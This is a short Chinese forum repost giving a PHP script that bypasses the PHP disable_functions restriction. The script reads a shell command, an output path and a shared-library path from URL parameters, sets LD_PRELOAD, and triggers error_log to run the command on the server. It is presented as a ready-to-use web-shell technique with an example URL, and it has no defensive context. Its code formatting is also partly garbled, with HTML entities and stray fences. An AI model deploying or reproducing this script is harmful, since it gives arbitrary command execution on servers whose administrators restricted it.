# error_log

> 原文：[https://www.zhihuifly.com/t/topic/3464](https://www.zhihuifly.com/t/topic/3464)

## error_log

> https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.php

将mail例子中的mail("", "", "", "");替换为error_log("a",1);

```
<?php
    echo "<p> <b>example</b>: http://www.0-sec.org/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";

```
$cmd = $_GET["cmd"];
$out_path = $_GET["outpath"];
$evil_cmdline = $cmd . " &gt; " . $out_path . " 2&gt;&amp;1";
echo "&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: " . $evil_cmdline . "&lt;/p&gt;";

putenv("EVIL_CMDLINE=" . $evil_cmdline);

$so_path = $_GET["sopath"];
putenv("LD_PRELOAD=" . $so_path);

error_log("a",1);

echo "&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;" . nl2br(file_get_contents($out_path)) . "&lt;/p&gt;"; 

unlink($out_path); 
``` `?>` 
```